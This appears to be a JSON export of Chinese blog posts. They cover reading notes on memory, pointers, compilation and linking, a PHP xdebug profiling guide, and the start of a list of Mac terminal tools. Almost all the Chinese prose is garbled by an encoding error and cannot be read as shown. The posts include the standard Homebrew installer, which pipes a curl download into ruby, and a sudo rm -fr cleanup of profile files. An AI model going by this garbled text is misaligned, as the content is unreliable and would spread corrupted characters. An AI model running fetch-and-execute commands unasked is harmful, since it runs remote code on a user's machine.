äºŒè¿›åˆ¶å’Œåè¿›åˆ¶åœ¨å®é™…çš„ç¨‹åºä¸­ï¼Œå¾€å¾€ä¸ä¼šç›´æ¥ä½¿ç”¨äºŒè¿›åˆ¶æ¥è¡¨ç¤ºï¼Œå› ä¸ºå¤ªé•¿äº†ï¼Œä¸€ä¸ªäºŒè¿›åˆ¶å°±éœ€è¦å…«ä½æ¥è¡¨ç¤ºã€‚ äºŒè¿›åˆ¶æ•°çš„ 4 ä½ï¼Œæ­£å¥½ç›¸å½“äºåå…­è¿›åˆ¶æ•°çš„ 1 ä½ã€‚ å†…å­˜å…¶å®ï¼Œä»ç‰©ç†ä¸Šæ¥çœ‹ï¼Œå†…å­˜çš„æ„é€ éå¸¸ç®€å•ã€‚åªè¦åœ¨ç¨‹åºä¸ŠèŠ±ä¸€äº›å¿ƒæ€ï¼Œå°±å¯ä»¥å°†å†…å­˜å˜æ¢æˆå„ç§å„æ ·çš„æ•°æ®ç»“æ„æ¥ä½¿ç”¨ã€‚ å†…å­˜å®é™…ä¸Šæ˜¯ä¸€ç§åä¸ºå†…å­˜ IC çš„ç”µå­å…ƒä»¶ã€‚ å†…å­˜ IC ä¸­æœ‰ç”µæºã€åœ°å€ä¿¡å·ã€æ•°æ®ä¿¡å·ã€æ§åˆ¶ä¿¡å·ç­‰ç”¨äºè¾“å…¥è¾“å‡ºçš„å¤§é‡å¼•è„š(IC çš„å¼•è„š)ï¼Œé€šè¿‡ä¸ºå…¶æŒ‡å®šåœ°å€(address)ï¼Œæ¥è¿›è¡Œæ•°æ®çš„è¯»å†™ã€‚ é‚£ä¹ˆï¼Œè¿™ä¸ªå†…å­˜IC ä¸­èƒ½å­˜æ”¾å¤šå°‘æ•°æ®å‘¢ï¼Ÿ æ•°æ®ä¿¡å·å¼•è„šæœ‰ D0~D7å…±å…«ä¸ªï¼Œè¡¨ç¤ºä¸€æ¬¡å¯ä»¥è¾“å…¥è¾“å‡º 8 ä½(= 1 å­—èŠ‚)çš„æ•°æ®ã€‚ åœ°å€ä¿¡å·å¼•è„šæœ‰ A0A9 å…±åä¸ªï¼Œè¡¨ç¤ºå¯ä»¥æŒ‡å®š `00000000001111111111` å…±1024 ä¸ªåœ°å€ã€‚ è€Œåœ°å€æ˜¯ç”¨æ¥è¡¨ç¤ºæ•°æ®çš„å­˜å‚¨åœºæ‰€ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å¾—å‡ºè¿™ Aä¸ªå†…å­˜ IC ä¸­å¯ä»¥å­˜å‚¨ 1024 ä¸ª 1 å­—èŠ‚çš„æ•°æ®ã€‚å› ä¸º 1024 = 1Kï¼Œæ‰€ä»¥æ”¹å†…å­˜IC çš„å®¹é‡æ˜¯1KBã€‚ æŒ‡é’ˆæŒ‡é’ˆä¹Ÿæ˜¯ä¸€ç§å˜é‡ï¼Œå®ƒæ‰€è¡¨ç¤ºçš„ä¸æ˜¯æ•°æ®çš„å€¼ï¼Œè€Œæ˜¯å­˜å‚¨ç€æ•°æ®çš„å†…å­˜çš„åœ°å€ã€‚ é€šè¿‡ä½¿ç”¨æŒ‡é’ˆï¼Œå°±å¯ä»¥å¯¹ä»»æ„æŒ‡å®šåœ°å€çš„æ•°æ®è¿›è¡Œè¯»å†™ã€‚ æ•°ç»„çš„å®šä¹‰ä¸­æ‰€æŒ‡å®šçš„æ•°æ®ç±»å‹ï¼Œä¹Ÿè¡¨ç¤ºä¸€æ¬¡èƒ½å¤Ÿè¯»å†™çš„å†…å­˜å¤§å°ã€‚ é«˜çº§ç¼–ç¨‹è¯­è¨€çš„æ•°ç»„åˆ™å®Œå…¨çœç•¥äº†è¿™äº›æ¦‚å¿µï¼Œç›´æ¥å®šä¹‰ä¸€ä¸ªæ•°ç»„ï¼Œå°±å¯ä»¥æ”¾å…¥ä»»æ„ç±»å‹çš„æ•°æ®ï¼ˆintã€floatã€doubleã€stringã€objectç­‰ï¼‰ã€‚ æŒ‡é’ˆçš„æ¦‚å¿µä¹Ÿæ˜¯ç±»ä¼¼ï¼ŒæŒ‡é’ˆçš„æ•°æ®ç±»å‹è¡¨ç¤ºä¸€æ¬¡å¯ä»¥è¯»å†™çš„é•¿åº¦ã€‚ æ ˆã€é˜Ÿåˆ—åŠç¯å½¢ç¼“å†²åŒºæ ˆçš„åŸæ„æ˜¯â€œå¹²è‰å †ç§¯å¦‚å±±â€ã€‚å¹²è‰å †ç§¯æˆå±±åï¼Œæœ€åå †çš„å¹²è‰ä¼š è¢«æœ€å…ˆæŠ½å–å‡ºæ¥ï¼ˆåè¿›å…ˆå‡ºï¼‰ã€‚ è€Œé˜Ÿåˆ—åˆ™æ˜¯å®Œå…¨ç›¸åçš„ä¸€ç§æ•°æ®ç»“æ„ï¼Œå…ˆè¿›å…ˆå‡ºã€‚ å†…å­˜å’Œç£ç›˜ä¸è¯»å…¥å†…å­˜å°±æ— æ³•è¿è¡Œè®¡ç®—æœºä¸­ä¸»è¦çš„å­˜å‚¨éƒ¨ä»¶æ˜¯å†…å­˜å’Œç£ç›˜ã€‚ç£ç›˜ä¸­å­˜å‚¨çš„ç¨‹åºï¼Œå¿…é¡»è¦åŠ è½½åˆ°å†…å­˜åæ‰èƒ½è¿è¡Œã€‚ ä¸ºä»€ä¹ˆç¨‹åºä¸€å®šè¦åœ¨å†…å­˜ä¸­è¿è¡Œï¼Ÿ è¿™æ˜¯å› ä¸ºï¼Œè¿™æ˜¯å› ä¸ºè´Ÿè´£è§£æå’Œè¿è¡Œç¨‹åºå†…å®¹çš„CPUï¼Œéœ€è¦é€šè¿‡å†…éƒ¨ç¨‹åºè®¡æ•°å™¨æ¥æŒ‡å®šå†…å­˜åœ°å€ï¼Œç„¶åæ‰èƒ½è¯»å‡ºåœ°å€ã€‚ å³ä½¿CPU å¯ä»¥ç›´æ¥è¯»å‡ºå¹¶è¿è¡Œç£ç›˜ä¸­ä¿å­˜çš„ç¨‹åºï¼Œç”±äºç£ç›˜è¯»å–é€Ÿåº¦æ…¢ï¼Œç¨‹åºçš„è¿è¡Œé€Ÿåº¦è¿˜æ˜¯ä¼šé™ä½ã€‚ æœ¬æ–‡ä¸­çš„æ‰€æœ‰å›¾ç‰‡å‡æ¥è‡ªã€Šç¨‹åºæ˜¯å¦‚ä½•è·‘èµ·æ¥çš„ã€‹ã€‚ ç£ç›˜ç¼“å­˜åŠ é€Ÿäº†ç£ç›˜è®¿é—®é€Ÿåº¦ç£ç›˜ç¼“å­˜æŒ‡çš„æ˜¯æŠŠä»ç£ç›˜ä¸­è¯»å–çš„æ•°æ®å­˜å‚¨åˆ°å†…å­˜ä¸­çš„æ–¹å¼ã€‚ ç£ç›˜è®¿é—®æé«˜è®¿é—®é€Ÿåº¦çš„æœºåˆ¶ï¼š è™šæ‹Ÿå†…å­˜æŠŠç£ç›˜ä½œä¸ºéƒ¨åˆ†å†…å­˜æ¥ä½¿ç”¨è™šæ‹Ÿå†…å­˜æ˜¯æŠŠç£ç›˜ä½œä¸ºå‡è±¡çš„å†…å­˜æ¥ä½¿ç”¨ã€‚è¿™ä¸ç£ç›˜ç¼“å­˜æ˜¯å‡è±¡çš„ç£ç›˜ï¼ˆå®é™…æ˜¯å†…å­˜ï¼‰æ˜¯ç›¸å¯¹çš„ï¼Œè™šæ‹Ÿå†…å­˜æ˜¯å‡è±¡çš„å†…å­˜ï¼ˆå®é™…æ˜¯ç£ç›˜ï¼‰ã€‚ äº²è‡ªå°è¯•å‹ç¼©æ•°æ®æ–‡ä»¶æ˜¯å°†æ•°æ®å­˜å‚¨åœ¨ç£ç›˜ç­‰å­˜å‚¨åª’ä»‹ä¸­çš„ä¸€ç§å½¢å¼ï¼Œç¨‹åºæ–‡ä»¶ä¸­å­˜å‚¨æ•°æ®çš„å•ä½æ˜¯å­—èŠ‚ã€‚ æˆ‘ä»¬æŠŠèƒ½è¿˜åŸåˆ°å‹ç¼©å‰çŠ¶æ€çš„å‹ç¼©ç§°ä¸º å¯é€†å‹ç¼©ï¼Œæ— æ³•è¿˜åŸåˆ°å‹ ç¼©å‰çŠ¶æ€çš„å‹ç¼©ç§°ä¸º éå¯é€†å‹ç¼©ã€‚ ä»æºæ–‡ä»¶åˆ°å¯æ‰§è¡Œæ–‡ä»¶åœ¨ç¨‹åºè¿è¡Œæ—¶ï¼Œç”¨æ¥åŠ¨æ€ç”³è¯·åˆ†é…æ•°æ®å’Œå¯¹è±¡çš„å†…å­˜åŒºåŸŸå½¢å¼ç§°ä¸ºå †ã€‚ æºä»£ç ç¼–è¯‘ =ã€‹æœ¬åœ°ä»£ç ï¼ˆæœºå™¨ä»£ç ï¼‰=ã€‹dumpï¼ˆæ¯ä¸ªå­—èŠ‚ç”¨ 2 ä½åå…­è¿›åˆ¶æ•°æ¥è¡¨ç¤ºçš„æ–¹å¼ï¼‰ ä»…é ç¼–è¯‘æ˜¯æ— æ³•å¾—åˆ°å¯æ‰§è¡Œæ–‡ä»¶çš„ï¼Œç¼–è¯‘å™¨ç¼–è¯‘ä»…ä»…åªæ˜¯å¾—åˆ°äº†æœ¬åœ°æ–‡ä»¶ï¼Œä¸ºäº†å¾—åˆ°å¯æ‰§è¡Œæ–‡ä»¶ï¼Œè¿˜éœ€è¦è¿›è¡Œâ€é“¾æ¥â€œå¤„ç†ã€‚ ç¼–è¯‘åœ¨Windows ä¸‹ï¼Œç¼–è¯‘åç”Ÿæˆçš„ä¸æ˜¯ EXE æ–‡ä»¶ï¼Œè€Œæ˜¯æ‰©å±•åä¸º.objçš„ç›®æ ‡æ–‡ä»¶ï¼Œåœ¨Unix ä¸‹ï¼Œç¼–è¯‘åç”Ÿæˆçš„ä¹Ÿä¸æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ï¼Œè€Œæ˜¯æ‰©å±•åä¸º.o çš„ç›®æ ‡æ–‡ä»¶ã€‚ è¿™äº›æ–‡ä»¶æ— æ³•ç›´æ¥è¿è¡Œï¼Œè¿™æ˜¯å› ä¸ºç¼–è¯‘è¿‡ç¨‹åªæ˜¯æ£€æŸ¥è¯­æ³•ï¼ˆå‡½æ•°ã€å˜é‡çš„å£°æ˜ï¼‰æ˜¯å¦æ­£ç¡®ã€‚ Mac ä¸‹ç¼–è¯‘main.cpp æ–‡ä»¶ï¼š 123$ gcc -c main.cpp$ ls main.cpp main.o é“¾æ¥æ‰¾åˆ°æ‰€è¦ç”¨åˆ°å‡½æ•°æ‰€åœ¨çš„ç›®æ ‡æ–‡ä»¶å¹¶ç»“åˆï¼Œç”Ÿæˆä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶çš„å¤„ç†å°±æ˜¯é“¾æ¥ï¼Œè¿è¡Œè¿æ¥çš„ç¨‹åºè¢«ç§°ä¸ºé“¾æ¥å™¨ã€‚ Mac ä¸‹é“¾æ¥main.o æ–‡ä»¶ï¼š 12$ gcc main.o -o main$ main.cpp main.o main ä¸¤æ­¥å¯ä»¥åˆå¹¶æˆä¸€æ­¥ï¼š 123$ gcc main.cpp$ ls main.cpp a.out æ€»ç»“ï¼š main.cppï¼šæºä»£ç æ–‡ä»¶ main.oï¼šæºä»£ç æ–‡ä»¶ç¼–è¯‘åç”Ÿæˆçš„æœ¬åœ°ä»£ç ï¼ˆæœºå™¨è¯­è¨€ï¼‰ mainï¼šå¯æ‰§è¡Œæ–‡ä»¶ a.outï¼šå¯æ‰§è¡Œæ–‡ä»¶ï¼ˆé»˜è®¤åç§°ï¼‰ å½“ç¨‹åºåŠ è½½åˆ°å†…å­˜åï¼Œé™¤æ­¤ä¹‹å¤–è¿˜ä¼šé¢å¤–ç”Ÿæˆä¸¤ä¸ªç»„ï¼Œé‚£å°±æ˜¯å †å’Œæ ˆã€‚ æ ˆæ˜¯ç”¨æ¥å­˜å‚¨å‡½æ•°å†…éƒ¨ä¸´æ—¶ä½¿ç”¨çš„å˜é‡ï¼ˆå±€éƒ¨å˜é‡ï¼‰ï¼Œä»¥åŠå‡½æ•°è°ƒç”¨æ—¶æ‰€ç”¨çš„å‚æ•°çš„å†…å­˜åŒºåŸŸã€‚å †æ˜¯ç”¨æ¥å­˜å‚¨ç¨‹åºè¿è¡Œæ—¶çš„ä»»æ„æ•°æ®åŠå¯¹è±¡çš„å†…å­˜é¢†åŸŸã€‚ æ— è®ºæ˜¯ C è¯­è¨€è¿˜æ˜¯ C++ï¼Œå¦‚æœæ²¡æœ‰åœ¨ç¨‹åºä¸­æ˜ç¡®é‡Šæ”¾å †çš„å†…å­˜ç©ºé—´ï¼Œé‚£ä¹ˆå³ä½¿åœ¨å¤„ç†å®Œæ¯•åï¼Œè¯¥å†…å­˜ç©ºé—´ä»ä¼šä¸€ç›´æ®‹ç•™ã€‚è¿™ä¸ªç°è±¡ç§°ä¸º å†…å­˜æ³„éœ²ã€‚ ç¼–è¯‘å™¨å’Œè§£æå™¨çš„åŒºåˆ«ï¼Ÿç¼–è¯‘å™¨æ˜¯åœ¨ç¨‹åºè¿è¡Œä¹‹å‰å¯¹æ‰€æœ‰æºä»£ç è¿›è¡Œè§£é‡Šå¤„ç†ã€‚è§£æå™¨åˆ™æ˜¯åœ¨è¿è¡Œæ—¶å¯¹æºä»£ç çš„å†…å®¹ä¸€è¡Œä¸€è¡Œåœ°è¿›è¡Œè§£é‡Šå¤„ç†ã€‚ æ“ä½œç³»ç»Ÿå’Œåº”ç”¨çš„å…³ç³»æ“ä½œç³»ç»Ÿæœ¬èº«å¹¶ä¸æ˜¯å•ç‹¬çš„ç¨‹åºï¼Œè€Œæ˜¯å¤šä¸ªç¨‹åºçš„é›†åˆä½“ã€‚ åˆæœŸçš„æ“ä½œç³»ç»Ÿ = ç›‘æ§ç¨‹åº + åŸºæœ¬çš„è¾“å…¥è¾“å‡ºç¨‹åº åœ¨æ“ä½œç³»ç»Ÿè¿™ä¸ªè¿è¡Œç¯å¢ƒä¸‹ï¼Œåº”ç”¨å¹¶ä¸èƒ½ç›´æ¥æ§åˆ¶ç¡¬ä»¶ï¼Œè€Œæ˜¯é€šè¿‡æ“ä½œç³»ç»Ÿæ¥é—´æ¥æ§åˆ¶ç¡¬ä»¶ã€‚ åº”ç”¨ç¨‹åºç»è¿‡ OS é—´æ¥åœ°æ§åˆ¶ç¡¬ä»¶ï¼š é«˜çº§è¯­è¨€çš„å¯ç§»æ¤æ€§å’Œç³»ç»Ÿè°ƒç”¨C è¯­è¨€ç­‰é«˜çº§ç¼–ç¨‹è¯­è¨€å¹¶ä¸ä¾å­˜ç‰¹å®šçš„æ“ä½œç³»ç»Ÿã€‚è¿™æ˜¯å› ä¸ºç”¨é«˜çº§ç¼–ç¨‹è¯­è¨€ç¼–å†™çš„åº”ç”¨åœ¨ç¼–è¯‘åï¼Œå°±è½¬æ¢æˆäº†åˆ©ç”¨ç³»ç»Ÿè°ƒç”¨çš„æœ¬åœ°ä»£ç ã€‚ é«˜çº§è¯­è¨€ç¼–å†™çš„å‡½æ•°è°ƒç”¨åœ¨ç¼–è¯‘ä¹‹åå˜æˆäº†ç³»ç»Ÿè°ƒç”¨ï¼š é€šè¿‡æ±‡ç¼–è¯­è¨€äº†è§£ç¨‹åºçš„å®é™…æ„æˆå‰é¢çš„ç« èŠ‚å·²ç»å¤šæ¬¡æåˆ°äº†ï¼Œè®¡ç®—æœºCPU èƒ½ç›´æ¥è§£é‡Šè¿è¡Œçš„åªæœ‰æœ¬åœ°ä»£ç ï¼ˆæœºå™¨è¯­è¨€ï¼‰ç¨‹åºã€‚ ç”¨C è¯­è¨€ç­‰é«˜çº§ç¼–ç¨‹è¯­è¨€ç¼–å†™çš„æºä»£ç ï¼Œéœ€è¦é€šè¿‡å„è‡ªçš„ç¼–è¯‘å™¨ç¼–è¯‘åï¼Œè½¬æ¢æˆæœ¬åœ°ä»£ç ã€‚ é€šè¿‡è°ƒæŸ¥æœ¬åœ°ä»£ç çš„å†…å®¹ï¼Œå¯ä»¥äº†è§£ç¨‹åºæœ€ç»ˆæ˜¯ä»¥ä½•ç§å½¢å¼æ¥è¿è¡Œçš„ã€‚ä½†æ˜¯ï¼Œå¦‚æœç›´æ¥æ‰“å¼€æœ¬åœ°ä»£ç æ¥çœ‹çš„è¯ï¼Œåªèƒ½çœ‹åˆ°æ•°å€¼çš„ç½—åˆ—ã€‚ å¦‚æœç›´æ¥ä½¿ç”¨è¿™äº›æ•°å€¼æ¥ç¼–å†™ç¨‹åºçš„è¯ï¼Œè¿˜çœŸæ˜¯ä¸å¤ªå®¹æ˜“ç†è§£ã€‚å› è€Œ å°±äº§ç”Ÿäº†è¿™æ ·ä¸€ç§æƒ³æ³•ï¼Œé‚£å°±æ˜¯åœ¨å„æœ¬åœ°ä»£ç ä¸­ï¼Œé™„å¸¦ä¸Šè¡¨ç¤ºå…¶åŠŸèƒ½çš„è‹±è¯­å•è¯ç¼©å†™ã€‚ ä¾‹å¦‚ï¼Œåœ¨åŠ æ³•è¿ç®—çš„æœ¬åœ°ä»£ç ä¸­åŠ ä¸Š add(addition çš„ç¼©å†™)ã€åœ¨æ¯”è¾ƒè¿ç®—çš„æœ¬åœ°ä»£ç ä¸­åŠ ä¸Š cmp(compare çš„ç¼©å†™)ç­‰ã€‚è¿™äº›ç¼©å†™ç§°ä¸º åŠ©è®°ç¬¦ï¼Œä½¿ç”¨åŠ©è®°ç¬¦çš„ç¼–ç¨‹è¯­è¨€ç§°ä¸º æ±‡ç¼–è¯­è¨€ã€‚ ä¸è¿‡ï¼Œå³ä½¿æ˜¯ç”¨æ±‡ç¼–è¯­è¨€ç¼–å†™çš„æºä»£ç ï¼Œæœ€ç»ˆä¹Ÿå¿…é¡»è½¬æ¢æˆæœ¬åœ°ä»£ç æ‰èƒ½è¿è¡Œã€‚è´Ÿè´£è½¬æ¢å·¥ä½œçš„ç¨‹åºç§°ä¸ºæ±‡ç¼–å™¨ï¼Œè½¬æ¢è¿™ä¸€å¤„ç†æœ¬èº«ç§°ä¸ºæ±‡ç¼–ã€‚ ç”¨æ±‡ç¼–è¯­è¨€ç¼–å†™çš„æºä»£ç ï¼Œå’Œæœ¬åœ°ä»£ç æ˜¯ä¸€ä¸€å¯¹åº”çš„ã€‚å› è€Œï¼Œæœ¬åœ°ä»£ç ä¹Ÿå¯ä»¥åè¿‡æ¥è½¬æ¢æˆæ±‡ç¼–è¯­è¨€çš„æºä»£ç ã€‚æŒæœ‰è¯¥åŠŸèƒ½çš„é€†å˜æ¢ç¨‹åºç§°ä¸º åæ±‡ç¼–ç¨‹åºï¼Œé€†å˜æ¢è¿™ä¸€å¤„ç†æœ¬èº«ç§°ä¸ºåæ±‡ç¼–ã€‚","categories":[{"name":"è¯»ä¹¦ç¬”è®°","slug":"è¯»ä¹¦ç¬”è®°","permalink":"https://www.0x2beace.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"è¯»ä¹¦ç¬”è®°","slug":"è¯»ä¹¦ç¬”è®°","permalink":"https://www.0x2beace.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"}]},{"title":"PHP + xdebug åˆ†æä»£ç æ€§èƒ½ç“¶é¢ˆ","slug":"php-analysis-code-performance-bottleneck","date":"2021-01-19T12:12:54.000Z","updated":"2021-01-19T12:16:37.417Z","comments":true,"path":"php-analysis-code-performance-bottleneck/","link":"","permalink":"https://www.0x2beace.com/php-analysis-code-performance-bottleneck/","excerpt":"é€šå¸¸å¯ç”¨äº†xdebugæ’ä»¶ï¼Œæ€§èƒ½æµ‹è¯•è¾“å‡ºæ–‡ä»¶ä¼šä¼´éšç”Ÿæˆï¼Œé€šå¸¸æ˜¯ä»¥cachegrind.out.xxxx æ–‡ä»¶å­˜åœ¨ã€‚","text":"é€šå¸¸å¯ç”¨äº†xdebugæ’ä»¶ï¼Œæ€§èƒ½æµ‹è¯•è¾“å‡ºæ–‡ä»¶ä¼šä¼´éšç”Ÿæˆï¼Œé€šå¸¸æ˜¯ä»¥cachegrind.out.xxxx æ–‡ä»¶å­˜åœ¨ã€‚ è¯¥æ–‡ä»¶å¯ä»¥é€šè¿‡ç¬¬ä¸‰æ–¹å·¥å…·æ¥è¿›è¡Œä»£ç æ€§èƒ½åˆ†æã€‚ ä½†å¦‚æœæœ¬åœ°æœ‰å¤šä¸ªé¡¹ç›®/ç½‘ç«™ï¼Œæ‰€æœ‰çš„profile éƒ½è¾“å‡ºåˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­äº†ï¼Œè¿™æ ·å¹¶ä¸æ–¹ä¾¿åé¢è¿›è¡Œæ€§èƒ½åˆ†æã€‚ è‡ªå®šä¹‰profile æ–‡ä»¶åç§°å¯ä»¥é€šè¿‡é…ç½®xdebug.profiler_output_name å‚æ•°æ¥è®¾ç½®è¾“å‡ºæ–‡ä»¶åç§°ï¼Œéƒ¨åˆ†å‚æ•°å¦‚ä¸‹ï¼š ç¬¦å· å«ä¹‰ é…ç½®æ ·ä¾‹ æ ·ä¾‹æ–‡ä»¶å %c å½“å‰å·¥ä½œç›®å½•çš„crc32æ ¡éªŒå€¼ cachegrind.out.%c cachegrind.out.1258863198 %p å½“å‰æœåŠ¡å™¨è¿›ç¨‹çš„pid cachegrind.out.%p cachegrind.out.9685 %r éšæœºæ•° cachegrind.out.%r cachegrind.out.072db0 %s è„šæœ¬æ–‡ä»¶å(æ³¨) cachegrind.out.%s cachegrind.out._home_httpd_html_test_xdebug_test_php %t Unixæ—¶é—´æˆ³ï¼ˆç§’ï¼‰ cachegrind.out.%t cachegrind.out.1179434742 %u Unixæ—¶é—´æˆ³ï¼ˆå¾®ç§’ï¼‰ cachegrind.out.%u cachegrind.out.1179434749_642382 %H $_SERVER[â€˜HTTP_HOSTâ€™] cachegrind.out.%H cachegrind.out.localhost %R $_SERVER[â€˜REQUEST_URIâ€™] cachegrind.out.%R cachegrind.out._test_xdebug_test_php_var=1_var2 %S session_id (æ¥è‡ª$_COOKIE å¦‚æœè®¾ç½®äº†çš„è¯) cachegrind.out.%S cachegrind.out.c70c1ec2375af58f74b390bbdd2a679d %% %å­—ç¬¦ cachegrind.out.%% cachegrind.out.%% ç¼–è¾‘php.ini é…ç½®æ–‡ä»¶ï¼š 1xdebug.profiler_output_name &#x3D; cachegrind.out.%H ç„¶åé‡å¯ php serverã€‚ åœ¨Mac ä¸‹ï¼Œprofile æ–‡ä»¶å­˜æ”¾äº/var/tmp/ç›®å½•ä¸­ã€‚ æ€§èƒ½åˆ†æåœ¨Mac ä¸‹ï¼Œæœ‰MacCallGrind å’Œ qcachegrind å¯ä»¥ä½¿ç”¨ï¼Œä¸è¿‡å‰è€…æ˜¯æ”¶è´¹ï¼Œç›´æ¥é€šè¿‡Apple Storeä¸‹è½½ï¼Œåè€…æ˜¯å…è´¹ã€‚éœ€è¦æ‰‹åŠ¨å®‰è£…ã€‚ å®‰è£…graphvizï¼Œç”¨æ¥Call GraphåŠŸèƒ½ï¼š 1$ brew install graphviz å®‰è£… qcachegrindï¼š 1$ brew install qcachegrind å®‰è£…å®Œæˆä¹‹åï¼Œå°±å¯ä»¥æ‰“å¼€ qcachegrind åº”ç”¨äº†ï¼Œå›¾å½¢ç•Œé¢å¦‚ä¸‹ï¼š å…¶ä»–ä¸è¿‡éœ€è¦æ³¨æ„ï¼Œå¼€å¯äº†profileæ–‡ä»¶è¾“å‡ºä¹‹åï¼Œå¦‚æœæœ¬åœ°é¡¹ç›®å¤šçš„è¯ï¼Œå¾ˆå®¹æ˜“å ç”¨ç£ç›˜å¤§é¢ç§¯ç©ºé—´ï¼Œä¸‹å›¾æ˜¯æˆ‘åŠå¹´å·¦å³æ²¡æœ‰æ¸…ç†çš„çŠ¶æ€ï¼š å¯ä»¥ä½¿ç”¨å‘½ä»¤è¿›è¡Œæ¸…ç†ï¼š 1$ sudo rm -fr &#x2F;private&#x2F;var&#x2F;tmp&#x2F;cachegrind.out.* å‚è€ƒé“¾æ¥ ä½¿ç”¨xdebugå¯¹phpè¿›è¡Œprofileçš„è¾“å‡º php+xdebug+qcachegrind(mac)æ€§èƒ½åˆ†æ","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"}]},{"title":"Mac ä¸‹æœ‰å“ªäº›å¥½ç”¨çš„ç»ˆç«¯å·¥å…·","slug":"what-are-some-useful-terminal-tools-under-Mac","date":"2021-01-12T14:33:12.000Z","updated":"2021-04-03T09:42:07.392Z","comments":true,"path":"what-are-some-useful-terminal-tools-under-Mac/","link":"","permalink":"https://www.0x2beace.com/what-are-some-useful-terminal-tools-under-Mac/","excerpt":"è¿™ç¯‡ç¬”è®°ä¸»è¦æ˜¯ç”¨æ¥æ•´ç†è‡ªå·±ä¸€ç›´åœ¨ä½¿ç”¨çš„ä¸€äº›è¾ƒä¸ºå¥½ç”¨çš„ç»ˆç«¯å·¥å…·/æ‰©å±•ã€‚","text":"è¿™ç¯‡ç¬”è®°ä¸»è¦æ˜¯ç”¨æ¥æ•´ç†è‡ªå·±ä¸€ç›´åœ¨ä½¿ç”¨çš„ä¸€äº›è¾ƒä¸ºå¥½ç”¨çš„ç»ˆç«¯å·¥å…·/æ‰©å±•ã€‚ å› ä¸ºæˆ‘ä¸ªäººçš„ç»ˆç«¯é…ç½®æ˜¯ZSH + iTerm2ï¼Œæ‰€ä»¥æœ¬æ–‡çš„éƒ¨åˆ†ZSH æ‰©å±•å¯èƒ½ä¸é€‚ç”¨äºå…¶ä»–Shellç”¨æˆ·ã€‚ brewç»å¸¸ä¸ç»ˆç«¯æ‰“äº¤é“çš„ç”¨æˆ·ï¼Œå¯¹è¿™ä¸ªä¸€å®šä¸é™Œç”Ÿï¼Œå®ƒå°±æ˜¯ç±»ä¼¼Ubuntuä¸‹çš„apt-getè¿™æ ·çš„åŒ…ç®¡ç†å·¥å…·ã€‚ é€šå¸¸æˆ‘éœ€è¦æ­å»ºä¸€ä¸ªå…¨æ–°çš„å¼€å‘ç¯å¢ƒæ—¶ï¼Œå®ƒä¸€å®šæ˜¯ç¬¬ä¸€ä¸ªéœ€è¦å®‰è£…çš„å·¥å…·ã€‚ å®‰è£… brewï¼ˆbrew å®˜ç½‘ï¼‰ 1ruby -e &quot;$(curl -fsSL https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;Homebrew&#x2F;install&#x2F;master&#x2F;install)&quot; å¸¸ç”¨å‘½ä»¤å¦‚ä¸‹ï¼šå¸¸ç”¨å‘½ä»¤å¦‚ä¸‹ï¼š| å‘½ä»¤ | æè¿° ||â€” | â€” ||brew search package | æœç´¢è½¯ä»¶åŒ…||brew install package | å®‰è£…è½¯ä»¶åŒ…||brew uninstall package | å¸è½½è½¯ä»¶åŒ…||brew list | åˆ—å‡ºå·²å®‰è£…æ¸…å•||brew help | è·å–å¸®åŠ©| OSX æ‰©å±•osx æ‰©å±•æ˜¯zsh æä¾›çš„ä¸€ä¸ªæ§åˆ¶ç»ˆç«¯å’Œè®¿è¾¾ï¼ˆåŠŸèƒ½ä¹‹ä¸€ï¼‰çš„æ‰©å±•å·¥å…·ã€‚ å…¶ä¸­æœ€ä¸ºå¸¸ç”¨æ˜¯ofdå‘½ä»¤ï¼Œå°†å½“å‰shellçª—å£åœ¨è®¿è¾¾ä¸­æ‰“å¼€ã€‚ å¦ä¸€ä¸ªè¾ƒä¸ºå¸¸ç”¨çš„å‘½ä»¤æ˜¯cdfï¼Œå¯åœ¨shellä¸­ç›´æ¥è·³è½¬è‡³å½“å‰è®¿è¾¾çª—å£æ‰€åœ¨çš„è·¯å¾„ï¼ˆå¦‚æœå­˜åœ¨å¤šä¸ªè®¿è¾¾çª—å£ï¼Œé‚£ä¹ˆè·³è½¬è‡³æœ€å‰é¢çš„é‚£ä¸ªï¼‰ã€‚ å…¶ä»–å¸¸ç”¨å‘½ä»¤å¦‚ä¸‹ï¼š å‘½ä»¤ æè¿° tab åœ¨å½“å‰ç›®å½•æ‰“å¼€ä¸€ä¸ªæ–°çª—å£ split_tab åœ¨å½“å‰çª—å£æ‰“å¼€ä¸€ä¸ªæ°´å¹³çª—å£ vsplit_tab åœ¨å½“å‰çª—å£æ‰“å¼€ä¸€ä¸ªå‚ç›´çª—å£ ofd åœ¨è®¿è¾¾çª—å£ä¸­æ‰“å¼€å½“å‰ç›®å½• pfd è¿”å›æœ€å‰é¢çš„è®¿è¾¾çª—å£çš„è·¯å¾„ pfs è¿”å›å½“å‰æŸ¥æ‰¾ç¨‹åºé€‰æ‹© cdf cd åˆ°å½“å‰è®¿è¾¾çª—å£æ‰€åœ¨çš„è·¯å¾„ pushdf pushed åˆ°å½“å‰è®¿è¾¾ç›®å½• quick-look å¿«é€ŸæŸ¥çœ‹æŒ‡å®šæ–‡ä»¶ man-preview åœ¨é¢„è§ˆåº”ç”¨ç¨‹åºä¸­æ‰“å¼€ç‰¹å®šçš„æ‰‹å†Œé¡µ showfiles æ˜¾ç¤ºéšè—æ–‡ä»¶ hidefiles éšè—éšè—çš„æ–‡ä»¶ rmdsstore ä»¥é€’å½’æ–¹å¼åˆ é™¤ç›®å½•ä¸­çš„.DS_Storeæ–‡ä»¶ tmuxtmux æ˜¯ä¸€ä¸ªç»ˆç«¯ä¸‹çª—å£åˆ†å‰²çš„å·¥å…·ï¼Œæœ‰å…³å®ƒçš„å…·ä½“ä»‹ç»ï¼Œè¯·æŸ¥é˜…è¿™ç¯‡ç¬”è®°ã€‚ autojumpautojump - ç›®å½•å¿«é€Ÿè·³è½¬å‘½ä»¤è¡Œå·¥å…·ï¼Œä»æ­¤å‘Šåˆ«cd... cd...ã€‚ autojump æ˜¯ä¸€ä¸ªWindowsã€Linuxã€macOS 